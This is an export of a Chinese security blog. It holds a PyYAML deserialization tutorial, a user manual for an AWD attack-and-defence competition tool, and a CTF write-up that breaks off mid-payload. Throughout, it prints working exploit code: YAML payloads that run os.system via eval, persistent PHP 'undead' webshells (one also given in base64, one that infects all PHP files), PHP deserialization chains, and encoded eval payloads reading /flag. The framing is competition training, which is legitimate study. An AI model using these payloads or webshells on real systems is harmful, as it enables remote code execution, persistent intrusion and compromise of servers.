python/object\n\n```python\ndef construct_python_object(self, suffix, node):\n    # Format:\n    #   !!python/object:module.name { ... state ... }\n    instance = self.make_python_instance(suffix, node, newobj=True)\n    yield instance\n    deep = hasattr(instance, '__setstate__')\n    state = self.construct_mapping(node, deep=deep)\n    self.set_python_instance_state(instance, state)\n```\n\n执行 make_python_instance 时并没有传 args 或 kwds 参数，所以只能执行无参函数\n\n\n例如\n\n```python\nimport yaml\n\nclass User:\n    def __init__(self):\n        self.name = \"\"\n\n\npayload1 = \"\"\"!!python/object:__main__.User\nname: aaa\n\"\"\"\npayload2 = \"!!python/object:__main__.User {name: aaa}\"\n\ndata1 = yaml.load(payload1)\nprint(data1.name)\n\ndata2 = yaml.load(payload2)\nprint(data2.name)\n\n'''\naaa\naaa\n'''\n```\n\n\n### python/module\n\n代码中只调用了 find_python_module 来导入模块\n\n```python\ndef construct_python_module(self, suffix, node):\n    value = self.construct_scalar(node)\n    if value:\n        raise ConstructorError(\"while constructing a Python module\", node.start_mark,\n                \"expected the empty value, but found %r\" % value, node.start_mark)\n    return self.find_python_module(suffix, node.start_mark)\n```\n\n虽然 construct_python_module 没有调用逻辑，但是与任意文件上传搭配有奇效\n\n比如在upload目录下上传了恶意文件exp.py\n\n![](/img/summary/python_unserialize-12.png)\n\n\n就可以用`!!python/module:upload.exp`来导入\n\n```python\nimport yaml\n\nyaml.load('!!python/module:upload.exp')\n\n\n'''\nroot\n'''\n```\n\n\n一个小技巧：\n当文件名是 \\_\\_init\\_\\_.py 时，直接导入目录名即可，可以绕过.的限制\n\n\n\n\n### python/name\n\n代码逻辑与 python/module 非常相似，不过module只返回模块，而name返回模块下的属性和方法\n\n```python\ndef construct_python_name(self, suffix, node):\n    value = self.construct_scalar(node)\n    if value:\n        raise ConstructorError(\"while constructing a Python name\", node.start_mark,\n                \"expected the empty value, but found %r\" % value, node.start_mark)\n    return self.find_python_name(suffix, node.start_mark)\n```\n\n这个特性常用在获取未知变量的值上\n\n```python\nimport yaml\n\nkey = \"k1y.....\"\n\nconfig = '!!python/name:__main__.key'\nprint(yaml.load(config))\n\n'''\nk1y.....\n'''\n```\n\n\n## PyYAML >= 5.1\n\n新增的\n1：FullConstructor：默认的构造器。\n2：UnsafeConstructor：支持全部的强制类型转换\n3：Constructor：等同于 UnsafeConstructor\n\n```python\n__all__ = [\n    'BaseConstructor',\n    'SafeConstructor',\n    'FullConstructor',\n    'UnsafeConstructor',\n    'Constructor',\n    'ConstructorError'\n]\n```\n\n如果指定的构造器是 UnsafeConstructor 或者 Constructor ，那么直接用<5.1的方法打就好了\n\n```python\nyaml.unsafe_load(exp)\nyaml.unsafe_load_all(exp)\nyaml.load(exp, Loader=Loader)\nyaml.load(exp, Loader=UnsafeLoader)\nyaml.load_all(exp, Loader=Loader)\nyaml.load_all(exp, Loader=UnsafeLoader)\n```\n\n### 默认构造器下的利用方式\n\n这里以 PyYAML==5.1 为例子\n\n```python\ndef make_python_instance(self, suffix, node,\n        args=None, kwds=None, newobj=False, unsafe=False):\n    if not args:\n        args = []\n    if not kwds:\n        kwds = {}\n    cls = self.find_python_name(suffix, node.start_mark)\n    if not (unsafe or isinstance(cls, type)):\n        raise ConstructorError(\"while constructing a Python instance\", node.start_mark,\n                \"expected a class, but found %r\" % type(cls),\n                node.start_mark)\n    if newobj and isinstance(cls, type):\n        return cls.__new__(cls, *args, **kwds)\n    else:\n        return cls(*args, **kwds)\n\ndef find_python_name(self, name, mark, unsafe=False):\n    if not name:\n        raise ConstructorError(\"while constructing a Python object\", mark,\n                \"expected non-empty name appended to the tag\", mark)\n    if '.' in name:\n        module_name, object_name = name.rsplit('.', 1)\n    else:\n        module_name = 'builtins'\n        object_name = name\n    if unsafe:\n        try:\n            __import__(module_name)\n        except ImportError as exc:\n            raise ConstructorError(\"while constructing a Python object\", mark,\n                    \"cannot find module %r (%s)\" % (module_name, exc), mark)\n    if not module_name in sys.modules:\n        raise ConstructorError(\"while constructing a Python object\", mark,\n                \"module %r is not imported\" % module_name, mark)\n    module = sys.modules[module_name]\n    if not hasattr(module, object_name):\n        raise ConstructorError(\"while constructing a Python object\", mark,\n                \"cannot find %r in the module %r\"\n                % (object_name, module.__name__), mark)\n    return getattr(module, object_name)\n```\n\n可以看到引入了 unsafe ，并且有如下的规则\n\n```python\nif not (unsafe or isinstance(cls, type))\n#  module.name 必须是一个类\n\nif not module_name in sys.modules\n# 限制了导入的module必须在 sys.modules 中\n```\n\n**方法一：**\n\n最简单的方式就是遍历 sys.modules 字典，找一个满足条件的模块中能执行命令的类\n\n比如 subprocess.Popen\n\n```python\nyaml.load(\"!!python/object/apply:subprocess.Popen [whoami]\")\n```\n\n\n\n**方法二：**\n\n借助 map 来触发函数执行\n\n例如`map(eval, [\"__import__('os').system('whoami')\"])`\n\n>需要注意在python2中会直接返回结果，但是在python3中返回的就是一个map对象，需要用一些函数来遍历\n\n\n```python\n# python3\nlist(map(eval, [\"__import__('os').system('whoami')\"]))\nset(map(eval, [\"__import__('os').system('whoami')\"]))\ntuple(map(eval, [\"__import__('os').system('whoami')\"]))\nfrozenset(map(eval, [\"__import__('os').system('whoami')\"]))\nbytes(map(eval, [\"__import__('os').system('whoami')\"]))\n```\n\n转换成yaml格式\n\n```python\nimport yaml\n\n# python2\nyaml.load(\"\"\"\n!!python/object/new:map\n  - !!python/name:eval\n  - [\"__import__('os').system('whoami')\"]\n\"\"\")\n\n\n# python3\nyaml.load(\"\"\"\n!!python/object/new:tuple\n- !!python/object/new:map\n  - !!python/name:eval\n  - [\"__import__('os').system('whoami')\"]\n\"\"\")\n\nyaml.load(\"\"\"\n!!python/object/new:frozenset\n- !!python/object/new:map\n  - !!python/name:eval\n  - [\"__import__('os').system('whoami')\"]\n\"\"\")\n\nyaml.full_load(\"\"\"\n!!python/object/new:bytes\n- !!python/object/new:map\n  - !!python/name:eval\n  - [\"__import__('os').system('whoami')\"]\n\"\"\")\n\n```\n\n这里存在一个问题，在使用`!!python/object/new`的情况下只能使用 tuple，bytes 等函数来遍历map对象，用 list 或者 set 都不行（当然在 !!python/object/apply 下没有问题）\n\n\n这是因为上文提到的 python/object/new 与 python/object/apply 的不同之处导致的\n\n\n当调用 construct_python_object_apply 时会使 newobj 为 true，那么条件就成立了，就会调用 cls.\\_\\_new\\_\\_(cls, *args, **kwds)\n\n```python\nif newobj and isinstance(cls, type):\n    return cls.__new__(cls, *args, **kwds)\nelse:\n    return cls(*args, **kwds)\n```\n\n因为这几个函数的底层实现并不相同，所以部分函数不能使用 \\_\\_new\\_\\_ 来传值\n\n![](/img/summary/python_unserialize-13.png)\n\n\n**其他方法：**\n\n继续看 !!python/object/new 的代码，可以发现除了调用 make_python_instance 外还有三个判断，这三个判断在之前的payload中并没有使用，因为并没有传对应的值\n\n```python\nif state:\n    self.set_python_instance_state(instance, state)\nif listitems:\n    instance.extend(listitems)\nif dictitems:\n    for key in dictitems:\n        instance[key] = dictitems[key]\n```\n\n\n首先是当 listitems 存在，就会触发 instance 下的 extend 方法。那么我们可以创建一个类，在类中添加一个名为 extend 的方法，然后重写成 eval，就相当于 instance.eval(listitems)\n\n```python\n# 利用 type 创建一个新的类\na = type(\"rce\", (), {\"extend\": eval})\na.extend(\"__import__('os').system('whoami')\")\n```\n\n转成YAML\n\n```python\nyaml.full_load(\"\"\"\n!!python/object/new:type\nargs:\n  - rce\n  - !!python/tuple []\n  - {\"extend\": !!python/name:eval }\nlistitems: \"__import__('os').system('whoami')\"\n\"\"\")\n```\n\n![](/img/summary/python_unserialize-14.png)\n\n\nstate 的利用方式也是同样的，通过修改 `__setstate__` 达到执行函数的目的（与pickle中的利用__setstate__执行命令类似）\n\n```python\ndef set_python_instance_state(self, instance, state):\n    if hasattr(instance, '__setstate__'):\n        instance.__setstate__(state)\n    else:\n        slotstate = {}\n        if isinstance(state, tuple) and len(state) == 2:\n            state, slotstate = state\n        if hasattr(instance, '__dict__'):\n            instance.__dict__.update(state)\n        elif state:\n            slotstate.update(state)\n        for key, value in slotstate.items():\n            setattr(object, key, value)\n```\n\n```python\na = type(\"rce\", (), {\"__setstate__\": eval})\na.__setstate__(\"__import__('os').system('whoami')\")\n```\n\n转为YAML\n\n```python\nyaml.full_load(\"\"\"\n!!python/object/new:type\nargs:\n  - rce\n  - !!python/tuple []\n  - {\"__setstate__\": !!python/name:eval }\nstate: \"__import__('os').system('whoami')\"\n\"\"\")\n```\n\n![](/img/summary/python_unserialize-15.png)\n\n\n**总结：有能调用实例方法的地方，那么就可以构造一个实例，用恶意函数去替换，来执行我们的代码**\n\n比如 set_python_instance_state 下的 slotstate.update(state) 也可以rce\n\n\n\n```python\nyaml.full_load(\"\"\"\n!!python/object/new:type\n  args: []\n  state: !!python/tuple\n    - \"__import__('os').system('whoami')\"\n    - !!python/object/new:type\n      args:\n        - exp\n        - !!python/tuple []\n        - {\"update\": !!python/name:exec , \"items\": !!python/name:list }\n\"\"\")\n\n# 另一种写法，用 staticmethod 代替 type\nyaml.full_load(\"\"\"\n!!python/object/new:str\n    args: []\n    state: !!python/tuple\n      - \"__import__('os').system('whoami')\"\n      - !!python/object/new:staticmethod\n        args: []\n        state:\n          update: !!python/name:eval\n          items: !!python/name:list\n\"\"\")\n```\n\n\n\n参考文章：\n[SecMap - 反序列化（Python）](https://www.tr0y.wang/2022/02/03/SecMap-unserialize-python/)\n[python反序列化详解](https://tttang.com/archive/1885/)\n[Python pickle反序列化浅析](https://tttang.com/archive/1782/)\n[Pickle反序列化](https://goodapple.top/archives/1069)\n[SecMap - 反序列化（PyYAML）](https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml)","tags":["总结","python","反序列化"],"categories":["总结"]},{"title":"awd工具开发&使用说明","url":"/posts/48fe3a65/","content":"\n文章演示版本：V4.0.0\n最新版本：V4.0.0\n最后更新日期：2025/07/01\n\nGithub地址：[https://github.com/dr0n1/AWD_RAH](https://github.com/dr0n1/AWD_RAH)\n\n\n## 目标生成\n\n>使用场景：在目标扫描前如果没有下发靶机地址列表，则需要自己生成一份去扫描\n\n\n### ip段生成\n\n>使用场景：裁判给了一个C段（192.168.10.0），所有队伍的靶机都在这个C段中，具体ip需要自己发现\n>生成文件：ip.txt\n\n\n![](/img/项目/rah-1.png)\n\n输入`192.168.10.*`又或者是`10.10.*.1`(用*占位)即可在程序当前运行目录下**覆盖**生成一个`ip.txt`\n\n```text\n192.168.10.1:8080\n192.168.10.2:8080\n192.168.10.3:8080\n192.168.10.4:8080\n192.168.10.5:8080\n...\n...\n192.168.10.251:8080\n192.168.10.252:8080\n192.168.10.253:8080\n192.168.10.254:8080\n192.168.10.255:8080\n```\n\n### 单ip多端口生成\n\n>使用场景：某些小型比赛或训练赛，为了节约资源将所有靶机映射在同一台服务器的不同端口上\n>生成文件：ip.txt\n\n![](/img/项目/rah-2.png)\n\n同样的会在程序运行目录下**覆盖**生成`ip.txt`\n\n```text\n192.168.100.103:10000\n192.168.100.103:10001\n192.168.100.103:10002\n192.168.100.103:10003\n...\n...\n192.168.100.103:10297\n192.168.100.103:10298\n192.168.100.103:10299\n192.168.100.103:10300\n\n```\n\n\n### bugku专用\n\n>使用场景：针对线上的域名生成 例如 192-168-1-X.pvp3553.bugku.cn\n>生成文件：ip.txt\n\n![](/img/项目/rah-3.png)\n\n按以下规则输入即可,`{}`中表示生成的范围，以`-`分割\n\n```text\n192-168-1-{1-255}.pvp3553.bugku.cn\n192-168-{1-2}-{1-255}.pvp3553.bugku.cn\n```\n\n在当前目录下**覆盖**生成`ip.txt`\n\n```text\n192-168-1-1.pvp3553.bugku.cn\n192-168-1-2.pvp3553.bugku.cn\n192-168-1-3.pvp3553.bugku.cn\n192-168-1-4.pvp3553.bugku.cn\n...\n...\n192-168-1-252.pvp3553.bugku.cn\n192-168-1-253.pvp3553.bugku.cn\n192-168-1-254.pvp3553.bugku.cn\n192-168-1-255.pvp3553.bugku.cn\n```\n\n\n## 目标扫描\n\n>使用场景：自己生成靶机地址或通过平台下载后，进行特征扫描来识别题目\n>生成文件：<自命名>.txt\n\n### web靶机扫描\n\n先打开自己的web靶机，输入网页上可以看到的特征即可\n\n![](/img/项目/rah-4.png)\n\n\n### pwn靶机扫描\n\npwn靶机也是同理，先连上自己的看看会输出什么就填什么\n\n![](/img/项目/rah-5.png)\n\n\n## 写入不死马\n\n>使用场景：发现题目的默认后门或者rce点后写入不死马\n>生成文件：shell.txt  random.txt\n\n\n**在可以rce的参数后加`*`，多个参数用&连接**\n\n```php\n<?php\n@eval($_POST['admin_ccmd']);\n?>\n```\n如上，则在post中填入`admin_ccmd=*`\n\n---------------------------------\n\n**代码执行**：根据shell中的代码(例如eval或者system)来使用不同的payload\n**非常规路径**：对于`网站目录不是常规的/var/www/html`的情况下或者`网站根目录没有写权限时`使用，左框填绝对路径(需要可写)，右框填在网页中的体现。\n\n例如现在有一个网站结构如下\n\n```text\n/wwwroot/\n├── index.php\n├── upload\n├── xx\n└── xxx\n```\n\n并且根目录不可写\n\n那么就左框需要填写`/wwwroot/upload`  右框需要填写`/upload/`\n\n---------------------------------\n\n设置中还可以调整使用的shell\n\n```text\nshell1:一般复杂度。会在写入的所有子目录下繁殖生成不死马\n\nshell2:比较复杂。会循环感染所有php后缀的文件(写入一句话，密码和参数与不死马是一样的)，同时对不死马传入`_`可以返回所有感染的文件\n\nshell3:最简单的不死马。没有额外功能\n```\n\n![shell2](/img/项目/rah-34.png)\n\n---------------------------------\n\n设置->管理禁用函数\n\n```text\n可以对disable_functions进行配置，使用不同的payload写马\n\n可以手动输入或者输入一个phpinfo网址(用命令执行的不行)\n```\n\n设置->查看可用函数\n\n```text\n可以查看当前可用的函数\n```\n\n\n### 默认马\n\n\n通过Get传参的默认后门写入不死马：\n\n![](/img/项目/rah-6.png)\n\n通过Post传参的默认后门写入不死马(根目录不可写)：\n\n![](/img/项目/rah-7.png)\n\n通过Header传参的默认后门写入不死马：\n\n![](/img/项目/rah-27.png)\n\n\n同时会在当前目录下追加生成一个`shell.txt`来保存记录\n\n\n\n### 自定义不死马\n\n>使用场景：想写入自己自定义的不死马\n\n当勾选这个功能后，可以自定义不死马的内容\n\n例如一个不死马如下，密码是123456，访问的文件名是.666.php\n\n```php\n<?php\n    ignore_user_abort(true);\n    set_time_limit(0);\n    unlink(__FILE__);\n    $file = '.666.php';\n    $code = '<?php if(md5($_GET[\"pass\"])==\"e10adc3949ba59abbe56e057f20f883e\"){@eval($_POST[\"aa\"]);} ?>';\n    while (1){\n        file_put_contents($file,$code);\n        system('touch -m -d \"2018-12-01 09:10:12\" .666.php');\n        usleep(1);\n    }\n?>\n```\n\n使用前需要base64编码一次（工具页中提供base64加解密功能）\n\n```\nPD9waHAKICAgIGlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwogICAgc2V0X3RpbWVfbGltaXQoMCk7CiAgICB1bmxpbmsoX19GSUxFX18pOwogICAgJGZpbGUgPSAnLjY2Ni5waHAnOwogICAgJGNvZGUgPSAnPD9waHAgaWYobWQ1KCRfR0VUWyJwYXNzIl0pPT0iZTEwYWRjMzk0OWJhNTlhYmJlNTZlMDU3ZjIwZjg4M2UiKXtAZXZhbCgkX1BPU1RbImFhIl0pO30gPz4nOwogICAgd2hpbGUgKDEpewogICAgICAgIGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlLCRjb2RlKTsKICAgICAgICBzeXN0ZW0oJ3RvdWNoIC1tIC1kICIyMDE4LTEyLTAxIDA5OjEwOjEyIiAuNjY2LnBocCcpOwogICAgICAgIHVzbGVlcCgxKTsKICAgIH0KPz4=\n```\n\n\n![](/img/项目/rah-8.png)\n\n\n### 随机文件名\n\n>使用场景：防止其他队伍监控流量进行蹭车\n\n勾选后写入的shell的文件名，密码，连接参数随机产生\n\n![](/img/项目/rah-9.png)\n\n会在当前目录下追加生成`random.txt`来保存shell记录\n\n\n## 执行命令\n\n>使用场景：通过不死马或者其他漏洞点进行命令执行\n\n\n### 一般shell执行命令\n\n\n![](/img/项目/rah-10.png)\n\n\n\n### 通过随机马执行命令\n\n命令也会受到设置中disable_function的影响\n\n![](/img/项目/rah-11.png)\n\n\n### 获取flag\n\n>使用场景：批量获取窗口中的flag（通用。如果在其他页面也获取到了flag也可以使用此功能）\n>生成文件：flag.txt\n\n需要先通过执行`cat /flag`或`curl`获取到flag\n\n![](/img/项目/rah-12.png)\n\n点击获取flag按钮后，程序会自动在返回的结果中搜索包含`flag{}`的值并保存到`flag.txt`中\n\n如果flag格式并不是`flag{}`，则可以自定义匹配的正则表达式\n\n\n## 提交flag\n\n>使用场景：批量获取到flag后自动访问提交接口进行提交flag\n\n**flag用*占位。多个参数用&分割。注意在设置页中设置线程数或者选择延时（选择延时后线程失效），太大容易丢包**\n\nGet方式：`http://192.168.100.50:4444/api/flag?token=xxxx&flag=xxxx`\n\n![](/img/项目/rah-13.png)\n\n\nPost方式：\n\n![](/img/项目/rah-14.png)\n\n\n\n## ssh\n\n>使用场景：ssh弱口令\n>生成文件：ssh.txt new_ssh.txt\n\n比如裁判下发的ssh地址为`x.x.x.x:2222 密码：ctf@awd`，就可以知道所有队伍都是这个密码。而且有些比赛不设置防御时间，一开始就能连到其他队伍的ssh（这里就不得不提到某年的宁波市awd）\n\n### ssh扫描\n\n扫描受到网络等影响，有些时候可能会漏报，建议多执行几次(会自动去重)\n\n![](/img/项目/rah-15.png)\n\n扫描结果会保存在`ssh.txt`\n\n### ssh密码更改\n\n密码的复杂度有一定要求（看靶机的环境），建议设置的复杂一点\n\n![](/img/项目/rah-16.png)\n\n\n\n## 多人\n\n>使用场景：离线环境下 局域网中队友的信息传递\n\n其中A先当服务端(需要先在设置中设置好参数)\n\n![](/img/项目/rah-18.png)\n\n然后A点击启动服务\n\n![](/img/项目/rah-20.png)\n\n\n\n其余队友B和C当客户端(同样要先在设置中设置好参数)\n\n![](/img/项目/rah-21.png)\n\n![](/img/项目/rah-31.png)\n\nB和C设置好后点击连接服务即可\n\n![](/img/项目/rah-22.png)\n\n\n\nA B C 多人交互效果\n\n![](/img/项目/rah-23.png)\n\n主动点击断开效果\n\n![](/img/项目/rah-32.png)\n\n\n## 自定义\n\n>使用场景：1：批量发送一些请求，例如批量上传文件。2：提交flag。3：执行简单的pwn攻击\n\n### 执行自定义请求\n\n比如发现一个文件上传，然后进行批量上传\n\n![](/img/项目/rah-24.png)\n\n\n### 提交flag\n\n>如果觉得提交flag的参数过于多，又或者根本没有api接口的奇安信平台。就可以抓包后在这提交。提交时自动延时1秒\n\n将flag的位置替换成`{{{flag}}}`即可，程序会自动读取软件运行目录下的**flag.txt**进行替换\n\n```\nGET /api/flag?flag={{{flag}}} HTTP/1.1\nHost: 192.168.100.50:4444\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\nCookie: PHPSESSID=8me6lcna20rpmb9dfb3e6qvha3\nConnection: keep-alive\n\n\n```\n\n\n![](/img/项目/rah-29.png)\n\n\n\n\n\n\n### 执行简单的pwn攻击\n\n>可以执行简单的脚本（没有经过实战测试，所以可能有些bug）\n\n例子如下，需要注意的是要选择 安装过脚本中导入的库的 python路径\n\n~如果没有自动识别到，也可以手动更改路径~\n\n```python\nfrom pwn import *\np=remote('192.168.100.50',10101,timeout=1)\n\ncontext.os='linux'\nmax_=100\nmin_=0\nwhile True:\n\tnum=(max_+min_)//2\n\tp.sendlineafter(b\">>\",str(num).encode())\n\ttry:\n\t\td=p.readline(timeout=1)\n\texcept:\n\t\tbreak\n\tif b'Small' in d:\n\t\tif (min_==max_-1):\n\t\t\tp.sendlineafter(b\">>\",str(max_).encode())\n\t\t\tbreak\n\n\t\tmin_=num\n\n\telif b'Big' in d:\n\t\tif (min_==max_-1):\n\t\t\tp.sendlineafter(b\">>\",str(min_).encode())\n\t\t\tbreak\n\t\tmax_=num\n\telse:\n\t\tbreak\n\tprint(max_,min_,d)\ncontext.log_level='debug'\np.sendline(b'cat /flag')\np.readuntil(b'flag{')\n\n\n```\n\n\n![](/img/项目/rah-30.png)\n\n\n然后可以使用执行命令页面的获取flag来提取flag（这个功能是通用的，只要有flag出现在屏幕内）\n\n\n## 定时任务\n\n>使用场景：解放双手，自动运行\n>生成文件：log/task_log.txt\n\n在写入不死马，执行命令，提交flag三处可以选择定时执行任务，最短1分钟执行一次\n\n使用方法与正常操作一样，填完参数后点击定时按钮并选择时间即可\n\n**需要注意的是，目前实现的方式是定时点击按钮，所以填入的内容不要在运行期间更改，否则可能会执行失败**\n\n![](/img/项目/rah-25.png)\n\n如果想取消可以关闭程序或者在全局设置中点击 **管理定时任务** 按钮\n\n![](/img/项目/rah-26.png)\n\n运行结果会保存在`log/task_log.txt`\n\n>注意：此功能应谨慎使用，防止发送网络流量过大！注意观察 task_log.txt 的内容\n\n\n## 工具&设置\n\n>使用场景：base64，url的编码与解码，行去重与清屏\n\n支持拖放文件\n\n![](/img/项目/rah-17.png)\n\n全局设置中可以切换线程数量和超时时间，并且可以选择是否记录错误日志\n\n![](/img/项目/rah-19.png)\n\n\n## 笔记\n\n>使用场景：在离线环境下提供一些命令，仅供参考！！\n>生成文件：note.txt\n\n![](/img/项目/rah-28.png)\n\n其中自定义按钮可以自己记录一些临时的路径，密码之类的信息，会**实时**保存在当前目录下的note.txt\n\n\n\n## 更新日志\n\nV1.0.0：初始版本\nV1.1.0：添加多种扫描方式，优化代码逻辑\nV1.2.0：添加随机不死马功能，修复诺干bug\n\nV2.1.0：整体70%代码重构(扫描速度较上一代提升11倍)。新增ssh模块和设置模块\nV2.1.1：优化不死马的判断逻辑\nV2.2.0：新增局域网多人聊天模块\nV2.2.1：修复了若干BUG\nV2.2.2：更新ui，新增自定义请求包模块\nV2.2.3：添加全局超时时间设置，优化写入不死马模块(区分代码执行和命令执行，适应tp框架路径)\n\nV3.0.0：新增一机一码，添加记录错误日志功能，优化写入不死马/执行命令的逻辑\nV3.0.1：部分代码结构优化，添加定时任务功能\nV3.1.0：优化ip生成功能，添加head执行命令功能，优化复杂路径的适配，优化冗余代码\nV3.1.1：优化自定义模块(集成简单的pwn批量脚本执行/自识别flag)，新增笔记模块，优化总体使用体验\nV3.1.2：添加进度提示，增加新logo\nV3.1.3：修复一个严重BUG\n\nV4.0.0：优化重构大量代码(全局设置，多人模块细节)，结构标准化，优化shell\n\n\n\n同时感谢以下师傅对AWD_RAH提出的宝贵建议\n\n{% note info simple %}\n@Datch （定时运行）\n@liangmo （head头一句话）\n@淡灬看夏丶恋雨(a13niL) （笔记功能）\n@蓝猫少爷 （另一种提交flag的方式）\n{% endnote %}\n\n\n另外也感谢以下师傅反馈的bug\n\n{% note info simple %}\n@t1me0\n{% endnote %}\n\n","tags":["awd","自动化","自研工具"],"categories":["项目"]},{"title":"第六届浙江省大学生网络与信息安全竞赛-WP","url":"/posts/13f4d784/","content":"\n\n# web\n\n## 初赛[easy php]\n\n签到题\n\n```php\n<?php\nclass AAA{\n    public $cmd=\"system('cat /flag');\";\n\n    public function __call($name, $arguments){\n        eval($this->cmd);\n        return \"done\";\n    }\n}\n\nclass BBB{\n    public $param1;\n\n    public function __debuginfo(){\n        return [\n            'debugInfo' => 'param1' . $this->param1\n        ];\n    }\n}\n\nclass CCC{\n    public $func;\n\n    public function __toString(){\n        var_dump(\"aaa\");\n        $this->func->aaa();\n    }\n}\n\n$a = new BBB();\n$a->param1 = new CCC;\n$a->param1->func = new AAA;\necho urlencode(serialize($a));\n```\n\n\n\n## 初赛[can you read flag]\n\n>好像做复杂了\n\n访问页面返回`//eval($_GET[a]);`\n\n爆破一下看哪些符号能用\n\n可以用取反，例如`(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);`\n\n发现根目录有`flag`和`readflag`，flag没有权限读取\n\n![](/img/wp/2023/2023zhejiang-1.png)\n\nbase64转一下读取readflag\n\n`(~%8C%86%8C%8B%9A%92)(~%9D%9E%8C%9A%C9%CB%DF%D0%8D%9A%9E%9B%99%93%9E%98);`\n\n![](/img/wp/2023/2023zhejiang-2.png)\n\n执行readflag后要先输入一个`y`，然后进入循环开始计算式子，大概成功计算100多轮后读取flag并输出\n\n![](/img/wp/2023/2023zhejiang-3.png)\n\n\n靶机的web目录不能读写，在/tmp目录下写一个php脚本用来计算\n\n```php\n<?php\n$desc=array(\n        0=>array(\"pipe\",'r'),\n        1=>array(\"pipe\",'w'),\n        2=>array(\"file\",\"/tmp/error-output.txt\",'a')\n);\n$a=proc_open(\"/readflag\",$desc,$handle);\nis_resource($a);\n$wh=$handle[0];\n$rh=$handle[1];\necho \"$rh $wh open\\n\";\nvar_dump($handle);\n$read=fread($rh,2096);\necho \"$read\\n\";\nfwrite($wh,'y');\n\n$read=fread($rh,2048);\necho \"read: \".$read.\"\\n\";\n\n$read=fread($rh,2048);\necho \"$i:$read\\n\";\n$op=\"\\$value=\".trim(strtok($read,\" =\")).';';\n\necho $op.\"\\n\";\neval($op);\necho $value.\"\\n\".$op.\"\\n\";\nfwrite($wh,strval($value).PHP_EOL);\n$i=0;\nwhile ($i<200){\n    $read=fread($rh,2048);\n    echo \"$i:$read\\n\";\n    $op=\"\\$value=\".trim(strtok($read,\" =\")).';';\n\n    eval($op);\n    fwrite($wh,strval($value).PHP_EOL);\n        $i++;\n}\n```\n\n```php\n(~%8C%86%8C%8B%9A%92)(~%D7%9A%9C%97%90%DF%DD%AF%BB%C6%88%9E%B7%BE%B1%BC%98%CF%B4%B5%B8%AD%93%9C%CD%B2%C6%A6%A7%B5%86%A6%A7%94%90%BB%AE%90%B5%B2%BB%CF%D4%A6%A7%B5%86%A6%A7%94%90%B6%91%BD%8F%9C%B8%AA%96%B3%BC%9B%86%B5%86%94%8C%BB%AE%90%B5%B2%AB%CF%D4%A6%A7%B5%86%A6%A7%94%90%B6%91%BD%8F%9C%B8%AA%96%B3%BC%9B%CC%B5%86%94%8C%BB%AE%90%B5%B2%95%CF%D4%A6%A7%B5%86%A6%A7%94%90%B6%92%A5%8F%9D%B8%AA%96%B3%BC%B6%89%9B%B8%CE%88%B3%CD%A9%86%9C%92%C6%86%B3%A8%C6%CE%9B%B7%BD%CE%9B%BC%CA%CF%9A%B7%AE%96%B3%BC%9B%97%B5%86%94%B1%BC%96%94%C8%BB%AE%90%94%A6%AB%CE%88%9C%92%C6%95%A7%CD%C6%88%A5%A8%CB%90%B6%96%C6%86%A5%A8%B9%94%A5%92%87%97%A5%86%B6%8C%B5%B8%AD%93%9C%CD%B2%8C%B5%B8%97%97%9D%92%AD%8C%A5%AC%94%C8%BB%AE%8F%8F%9C%CE%C6%86%A5%A7%B1%89%9B%A7%B5%95%A5%AC%98%94%A6%AC%94%C8%BB%AE%90%94%9B%CD%98%C6%B5%B8%97%97%9D%92%AD%8C%A5%A9%8C%88%A7%AB%8C%B1%BC%96%AD%86%9E%BB%CF%94%9E%B8%B9%8A%A5%B8%87%93%A8%85%B9%9B%B0%88%CF%B4%A5%A8%B1%90%9D%86%BE%96%B5%B7%B5%90%B6%BC%AD%CC%9E%BC%BD%89%9C%B8%A9%8A%A7%B8%CB%96%B0%88%CF%B4%9B%92%B9%86%A7%CD%AD%CE%9D%A7%BE%90%B5%B8%97%97%9D%92%AD%8C%A5%AC%94%C8%BB%AE%90%94%9C%92%A9%97%A5%BB%CE%92%9C%92%A9%97%A5%BC%98%94%9C%92%98%8C%B2%95%BE%CA%B1%96%94%C8%BB%AE%8F%93%A6%CD%97%89%B6%BC%B6%94%9C%92%A9%97%A5%B9%87%8A%B6%95%8C%B1%BC%92%A5%CC%9C%92%93%CF%A5%AC%98%94%9B%CD%98%8C%B5%CC%94%91%B4%AB%8C%B1%BC%98%CF%B4%B5%B7%B5%93%A6%A8%AE%C6%A5%91%B5%93%A6%A8%AE%90%B5%B7%B5%90%B3%BB%B6%88%B1%BB%98%8F%B0%88%CF%B4%A5%A8%B1%90%9D%86%BE%96%9C%92%A9%97%A5%BB%90%98%B6%96%CB%94%9C%92%A9%97%A5%BC%CB%96%A7%B8%CB%96%B0%88%CF%B4%BB%AE%90%94%9C%92%A9%97%A5%BB%CE%92%9C%92%A9%97%A5%BC%98%94%9C%92%98%8C%B2%95%BE%CF%B0%BC%94%C8%BB%AE%8F%93%A6%CD%97%89%B6%BC%B6%94%9E%AB%90%94%9C%92%A9%97%A5%B9%87%8A%B6%95%8C%B1%BC%96%AD%89%9C%BB%CF%96%A7%BC%AD%CD%A6%A8%87%CE%A5%AB%CF%96%B3%91%AD%86%9E%A8%CF%90%9C%CC%AD%86%9B%B8%C6%8D%B4%BC%AD%86%A5%A8%B9%94%B3%BC%B6%98%AF%AC%B6%8F%B4%AC%CB%91%B0%86%9C%C8%BB%AE%90%B1%BC%92%A9%95%9E%B8%C7%98%B5%B8%C6%88%B3%96%B5%9C%9D%96%B6%C8%BB%AE%8F%93%9B%92%B9%8C%B4%BC%AD%89%9C%BC%94%C8%BB%AE%8F%93%A6%CD%97%89%B6%BC%AD%CD%A6%A8%87%CE%A5%AC%CB%96%A7%B8%CB%96%B3%96%AD%89%9C%BC%CB%96%A7%B8%CB%96%B0%88%CF%B4%A5%91%9B%86%9E%A7%AD%93%B4%BC%AD%CC%9E%BC%87%85%9B%B7%B5%CD%A6%A8%88%90%B5%B7%A5%97%9D%B7%A9%93%B4%AC%CA%AE%AC%B9%BD%99%AD%AA%C6%B2%B4%AB%8C%B1%BC%96%A